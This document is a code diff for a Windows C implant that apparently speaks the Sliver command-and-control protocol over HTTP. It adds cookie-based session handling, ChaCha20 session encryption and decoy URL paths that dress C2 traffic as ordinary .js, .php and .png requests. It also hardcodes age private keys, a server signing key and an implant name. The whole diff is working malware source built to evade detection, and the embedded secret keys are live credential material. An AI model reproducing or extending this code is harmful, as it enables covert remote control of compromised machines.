@@ -145,6 +145,9 @@ LPSTR GetHeaderString
 	else if (HeaderTy == CacheControl) {
 		return "Cache-Control";
 	}
+	else if (HeaderTy == Cookie) {
+		return "Cookie";
+	}
 	else if (HeaderTy == Connection) {
 		return "Connection";
 	}
@@ -235,6 +238,9 @@ LPSTR GetHeaderString
 	else if (HeaderTy == Server) {
 		return "Server";
 	}
+	else if (HeaderTy == SetCookie) {
+		return "Set-Cookie";
+	}
 	else if (HeaderTy == Te) {
 		return "TE";
 	}
@@ -262,6 +268,10 @@ LPSTR GetHeaderString
 	else if (HeaderTy == WwwAuthenticate) {
 		return "WWW-Authenticate";
 	}
+	else if (HeaderTy == UpgradeInsecureRequests) {
+		return "Upgrade-Insecure-Requests";
+		}
+	// UpgradeInsecureRequests
 }
 
 static DWORD WinHttpDefaultProxyConstant()
@@ -414,7 +424,7 @@ BOOL SetHeader
 		StrCatW(lpFullHeader, L"\r\n");
 	}
 
-	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, lstrlenW(lpFullHeader), WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
 	if (!Result) {
 		LogError(L"WinHttpAddRequestHeaders failed at %lls. Error code: 0x%08x.\n", __FUNCTIONW__, GetLastError());
 	}
@@ -429,7 +439,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
-	_In_ LPWSTR lpPath,
+	_In_ LPSTR lpPath,
 	_In_ DWORD dwNumberOfAttemps
 )
 {
@@ -442,8 +452,9 @@ HINTERNET SendRequest
 	DWORD dwLastError = 0;
 	DWORD dwFlag = WINHTTP_FLAG_REFRESH;
 
+
 	if (lpPath != NULL) {
-		pPath = DuplicateStrW(lpPath, 0);
+		pPath = ConvertCharToWchar(lpPath);
 	}
 	else if (lstrlenA(pUri->lpPathWithQuery) > 0) {
 		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
@@ -635,6 +646,7 @@ BOOL ReceiveData
 	} while (dwNumberOfBytesAvailable > 0);
 
 	bResult = TRUE;
+	Buffer = REALLOC(Buffer, dwTotalSize + 1);
 	*pData = Buffer;
 	*pdwDataSize = dwTotalSize;
 END:
@@ -778,6 +790,10 @@ VOID FreeSliverHttpClient
 		FREE(pClient->lpServerMinisignPublicKey);
 	}
 
+	if (pClient->lpCookiePrefix != NULL) {
+		FREE(pClient->lpCookiePrefix);
+	}
+
 	FreeWebProxy(pClient->HttpConfig.pProxyConfig);
 	FreeHttpClient(pClient->pHttpClient);
 	FREE(pClient);
@@ -916,6 +932,7 @@ PHTTP_RESP SendHttpRequest
 	pResult->dwStatusCode = dwStatusCode;
 CLEANUP:
 	FreeHttpRequest(pHttpRequest);
+
 	return pResult;
 };
 
@@ -931,19 +948,22 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	PBYTE pTemp = NULL;
 
 	// Tu dinh config --------------------------------------------------------------------
-	/*CHAR szRecipientPubKey[] = "age1m425fl9w4cew5rgx9ea3x3k22w6aurzn96xqd0dutz0xa2d834ss2jqfkn";
-	CHAR szPeerPubKey[] = "age1kqklxpvg45rw053jtwtcn2wn4wqetwy0mw6c0rln8m5a3tarlqcq94j8jq";
-	CHAR szPrivPrivKey[] = "AGE-SECRET-KEY-1F7J93DWQMN49F3A333ZA3766LND9T3LMT3GK3QHYFCGCRPWEKQHQ6NF3LK";
+	CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
+	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
 	LPSTR PollFiles[] = { "route", "app", "app.min", "array" };
 	LPSTR SessionPaths[] = { "rest", "v1", "auth", "authenticate" };
 	LPSTR SessionFiles[] = { "rpc", "index", "admin", "register" };
 	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
 	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
-	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";*/
+	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
+	UINT64 uEncoderNonce = 51666;
+	CHAR szSliverClientName[32] = "TALL_MEAT";
 
 	// Laptop config ---------------------------------------------------------------------
-	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
+	/*CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
 	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -955,7 +975,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 6979;
-	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
+	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";*/
 	// END -------------------------------------------------------------------------------
 	DWORD i = 0;
 
@@ -979,32 +999,32 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	}
 
 	pResult->HttpConfig.dwNumberOfAttemps = 10;
-	pResult->cbPollPaths = _countof(PollPaths);
+	pResult->cPollPaths = _countof(PollPaths);
 	for (i = 0; i < _countof(PollPaths); i++) {
 		pResult->PollPaths[i] = DuplicateStrA(PollPaths[i], 0);
 	}
 
-	pResult->cbPollFiles = _countof(PollFiles);
+	pResult->cPollFiles = _countof(PollFiles);
 	for (i = 0; i < _countof(PollFiles); i++) {
 		pResult->PollFiles[i] = DuplicateStrA(PollFiles[i], 0);
 	}
 
-	pResult->cbSessionFiles = _countof(SessionFiles);
+	pResult->cSessionFiles = _countof(SessionFiles);
 	for (i = 0; i < _countof(SessionFiles); i++) {
 		pResult->SessionFiles[i] = DuplicateStrA(SessionFiles[i], 0);
 	}
 
-	pResult->cbSessionPaths = _countof(SessionPaths);
+	pResult->cSessionPaths = _countof(SessionPaths);
 	for (i = 0; i < _countof(SessionPaths); i++) {
 		pResult->SessionPaths[i] = DuplicateStrA(SessionPaths[i], 0);
 	}
 
-	pResult->cbCloseFiles = _countof(CloseFiles);
+	pResult->cCloseFiles = _countof(CloseFiles);
 	for (i = 0; i < _countof(CloseFiles); i++) {
 		pResult->CloseFiles[i] = DuplicateStrA(CloseFiles[i], 0);
 	}
 
-	pResult->cbClosePaths = _countof(ClosePaths);
+	pResult->cClosePaths = _countof(ClosePaths);
 	for (i = 0; i < _countof(ClosePaths); i++) {
 		pResult->ClosePaths[i] = DuplicateStrA(ClosePaths[i], 0);
 	}
@@ -1038,11 +1058,12 @@ CLEANUP:
 	return pResult;
 }
 
+// Can kiem tra lai
 LPSTR JoinUrlPath
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient,
 	_In_ LPSTR* pSegments,
-	_In_ DWORD cbSegment
+	_In_ DWORD cSegment
 )
 {
 	LPSTR lpResult = NULL;
@@ -1055,26 +1076,28 @@ LPSTR JoinUrlPath
 	lpResult = ALLOC(cbResult + 1);
 	if (pClient->lpPathPrefix != NULL && StrCmpA(pClient->lpPathPrefix, "/")) {
 		cbPathPrefix = lstrlenA(pClient->lpPathPrefix);
-		if (cbPathPrefix > cbResult) {
+		if (cbPathPrefix >= cbResult) {
 			cbResult = cbPathPrefix * 2;
 			lpResult = REALLOC(lpResult, cbResult + 1);
 		}
 
-		lstrcpyA(&lpResult[dwPos], pClient->lpPathPrefix);
+		lstrcpyA(lpResult, pClient->lpPathPrefix);
 		dwPos += cbPathPrefix;
-		lstrcatA(&lpResult[dwPos++], "/");
+		lstrcatA(lpResult, "/");
+		dwPos++;
 	}
 
-	for (i = 0; i < cbSegment; i++) {
-		if (dwPos > cbResult) {
+	for (i = 0; i < cSegment; i++) {
+		if (dwPos >= cbResult) {
 			cbResult *= 2;
 			lpResult = REALLOC(lpResult, cbResult + 1);
 		}
 
-		lstrcatA(&lpResult[dwPos], pSegments[i]);
+		lstrcatA(lpResult, pSegments[i]);
 		dwPos += lstrlenA(pSegments[i]);
-		if (i < cbSegment - 1) {
-			lstrcatA(&lpResult[dwPos++], "/");
+		if (i < cSegment - 1) {
+			lstrcatA(lpResult, "/");
+			dwPos++;
 		}
 	}
 
@@ -1085,38 +1108,38 @@ LPSTR* RandomUrlPath
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient,
 	_In_ LPSTR* pSegments,
-	_In_ DWORD cbSegments,
+	_In_ DWORD cSegments,
 	_In_ LPSTR* pFileNames,
-	_In_ DWORD cbFileNames,
+	_In_ DWORD cFileNames,
 	_In_ LPSTR lpExtension,
-	_Out_ PDWORD pcbResult
+	_Out_ PDWORD pcCountOfResult
 )
 {
-	DWORD dwNumOfSegments = 0;
+	DWORD dwCountOfSegments = 0;
 	DWORD i = 0;
-	LPSTR* lpResult = NULL;
-	DWORD cbResult = 0;
+	LPSTR* pResult = NULL;
+	DWORD cResult = 0;
 	LPSTR lpFileName = NULL;
 	DWORD cbFileName = 0;
 
-	lpResult = ALLOC((pClient->dwMaxNumOfSegments + 1) * sizeof(LPSTR));
-	if (cbSegments > 0) {
-		dwNumOfSegments = GenRandomNumber32(pClient->dwMinNumOfSegments, pClient->dwMaxNumOfSegments);
-		for (i = 0; i < dwNumOfSegments; i++) {
-			lpResult[cbResult++] = DuplicateStrA(pSegments[GenRandomNumber32(0, cbSegments)], 0);
+	pResult = ALLOC((pClient->dwMaxNumOfSegments + 1) * sizeof(LPSTR));
+	if (cSegments > 0) {
+		dwCountOfSegments = GenRandomNumber32(pClient->dwMinNumOfSegments, pClient->dwMaxNumOfSegments);
+		for (i = 0; i < dwCountOfSegments; i++) {
+			pResult[cResult++] = DuplicateStrA(pSegments[GenRandomNumber32(0, cSegments)], 0);
 		}
 	}
 
-	lpResult = REALLOC(lpResult, (cbResult + 1) * sizeof(LPSTR));
-	lpFileName = DuplicateStrA(pFileNames[GenRandomNumber32(0, cbFileNames)], lstrlenA(lpExtension) + 1);
+	pResult = REALLOC(pResult, (cResult + 1) * sizeof(LPSTR));
+	lpFileName = DuplicateStrA(pFileNames[GenRandomNumber32(0, cFileNames)], lstrlenA(lpExtension) + 1);
 	lstrcatA(lpFileName, ".");
 	lstrcatA(lpFileName, lpExtension);
-	lpResult[cbResult++] = lpFileName;
-	if (pcbResult != NULL) {
-		*pcbResult = cbResult;
+	pResult[cResult++] = lpFileName;
+	if (pcCountOfResult != NULL) {
+		*pcCountOfResult = cResult;
 	}
 
-	return lpResult;
+	return pResult;
 }
 
 LPSTR ParseSegmentsUrl
@@ -1131,13 +1154,13 @@ LPSTR ParseSegmentsUrl
 	LPSTR lpResult = NULL;
 
 	if (SegmentType == PollType) {
-		pSegments = RandomUrlPath(pClient, pClient->PollPaths, pClient->cbPollPaths, pClient->PollFiles, pClient->cbPollFiles, "js", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pClient->PollPaths, pClient->cPollPaths, pClient->PollFiles, pClient->cPollFiles, "js", &dwNumOfSegments);
 	}
 	else if (SegmentType == SessionType) {
-		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, pClient->cbSessionPaths, pClient->SessionFiles, pClient->cbSessionFiles, "php", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, pClient->cSessionPaths, pClient->SessionFiles, pClient->cSessionFiles, "php", &dwNumOfSegments);
 	}
 	else if (SegmentType == CloseType) {
-		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, pClient->cbClosePaths, pClient->CloseFiles, pClient->cbCloseFiles, "png", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, pClient->cClosePaths, pClient->CloseFiles, pClient->cCloseFiles, "png", &dwNumOfSegments);
 	}
 	else {
 		goto CLEANUP;
@@ -1460,6 +1483,10 @@ PBYTE SessionEncrypt
 
 	pNonce = GenRandomBytes(CHACHA20_NONCE_SIZE);
 	Chacha20Poly1305Encrypt(pClient->pSessionKey, pNonce, pMessage, cbMessage, NULL, 0, &pResult, pcbCipherText);
+	pResult = REALLOC(pResult, (*pcbCipherText) + CHACHA20_NONCE_SIZE);
+	memcpy(pResult + CHACHA20_NONCE_SIZE, pResult, *pcbCipherText);
+	memcpy(pResult, pNonce, CHACHA20_NONCE_SIZE);
+	*pcbCipherText += CHACHA20_NONCE_SIZE;
 	if (pNonce != NULL) {
 		FREE(pNonce);
 	}
@@ -1489,6 +1516,9 @@ PSLIVER_HTTP_CLIENT SliverSessionInit
 	LPSTR lpRespData = NULL;
 	DWORD cbEncryptedSessionInit = 0;
 	PBYTE pMarshalledData = NULL;
+	DWORD dwSetCookieLength = 0;
+	WCHAR wszSetCookie[0x100];
+	LPWSTR lpTemp = NULL;
 
 	pSliverClient = SliverHttpClientInit(lpC2Url);
 	if (pSliverClient == NULL) {
@@ -1537,6 +1567,16 @@ PSLIVER_HTTP_CLIENT SliverSessionInit
 	}
 
 	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
+	dwSetCookieLength = sizeof(wszSetCookie);
+	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
+	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
+		LogError(L"WinHttpQueryHeaders failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
+	}
+
+	lpTemp = StrChrW(wszSetCookie, L'=');
+	lpTemp[0] = L'\0';
+	pSliverClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
 	bIsOk = TRUE;
 CLEANUP:
 	if (!bIsOk) {
@@ -1566,6 +1606,10 @@ CLEANUP:
 
 	if (pEncryptedSessionInit != NULL) {
 		FREE(pEncryptedSessionInit);
+	}
+
+	if (pDecodedResp != NULL) {
+		FREE(pDecodedResp);
 	}
 
 	FreeHttpResp(pResp);
